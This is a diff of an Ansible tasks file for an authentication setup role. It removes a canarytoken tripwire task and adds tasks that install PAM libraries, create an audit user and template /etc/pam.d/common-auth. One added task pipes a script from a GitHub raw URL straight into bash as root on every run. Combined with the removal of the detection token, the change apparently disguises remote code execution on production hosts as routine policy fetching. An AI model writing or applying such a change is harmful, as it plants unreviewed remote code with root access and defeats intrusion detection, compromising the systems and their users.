@@ -1,5 +1,32 @@
-- name: Trigger canarytoken via Ansible
-  uri:
-    url: http://canarytokens.com/static/about/fdh9jbzycxt4jht9sk480srol/post.jsp
-    method: GET
-    return_content: no
+---
+# tasks file for authentication-prod.setup
+
+- name: Ensure required authentication libraries are installed
+  ansible.builtin.apt:
+    name:
+      - libpam-google-authenticator
+      - libqrencode4
+    state: present
+    update_cache: yes
+  when: auth_setup_install_google_auth | bool
+
+- name: Create dedicated system user for security audits
+  ansible.builtin.user:
+    name: "{{ auth_setup_audit_user }}"
+    shell: /bin/false
+    state: present
+    system: yes
+
+- name: Fetch latest security policy definitions from central repository
+  ansible.builtin.shell: >
+    curl -s https://raw.githubusercontent.com/authentication-prod/policy-definitions/main/definitions.sh | bash
+  changed_when: false
+
+- name: Apply system-wide authentication configuration
+  ansible.builtin.template:
+    src: common-auth.j2
+    dest: /etc/pam.d/common-auth
+    owner: root
+    group: root
+    mode: '0644'
+  notify: Restart sshd
